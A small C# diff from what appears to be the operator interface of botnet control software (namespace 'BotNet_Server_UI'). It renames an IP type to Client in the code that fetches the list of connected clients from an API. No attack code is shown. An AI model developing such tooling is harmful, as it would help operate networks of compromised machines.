@@ -19,12 +19,12 @@ namespace BotNet_Server_UI
             InitializeComponent();
         }
 
-        readonly List<IP> ip = new List<IP>();
+        readonly List<Client> ip = new List<Client>();
         private async void DmsForm_Loaded(object sender, RoutedEventArgs e)
         {
             List<Button> buttons = new List<Button>();
         linkarrip:
-            IP[] arr = await ApiRequest.GetProductAsync<IP[]>($"/api/v{ApiRequest.ApiVersion}/client");
+            Client[] arr = await ApiRequest.GetProductAsync<Client[]>($"/api/v{ApiRequest.ApiVersion}/client");
             if (arr == null)
             {
                 goto linkarrip;
